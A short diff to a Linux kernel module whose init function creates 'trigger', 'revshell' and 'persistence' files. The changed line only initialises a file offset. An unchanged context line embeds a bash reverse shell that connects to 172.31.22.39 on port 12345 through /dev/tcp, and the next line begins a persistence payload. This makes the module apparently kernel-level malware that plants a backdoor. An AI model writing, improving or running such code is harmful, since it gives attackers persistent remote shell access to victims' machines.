@@ -12,7 +12,7 @@ MODULE_VERSION("1.0");
 
 static int __init lkm_file_create_init(void) {
     struct file *trigger_file, *revshell_file, *persistence_file;
-    loff_t pos_trigger = 0, pos_revshell = 0, pos_persistence;
+    loff_t pos_trigger = 0, pos_revshell = 0, pos_persistence = 0;
     char *trigger_content = "#!/bin/bash\n";
     char *revshell_content = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/172.31.22.39/12345 0>&1\n";
     char *persistence_content =
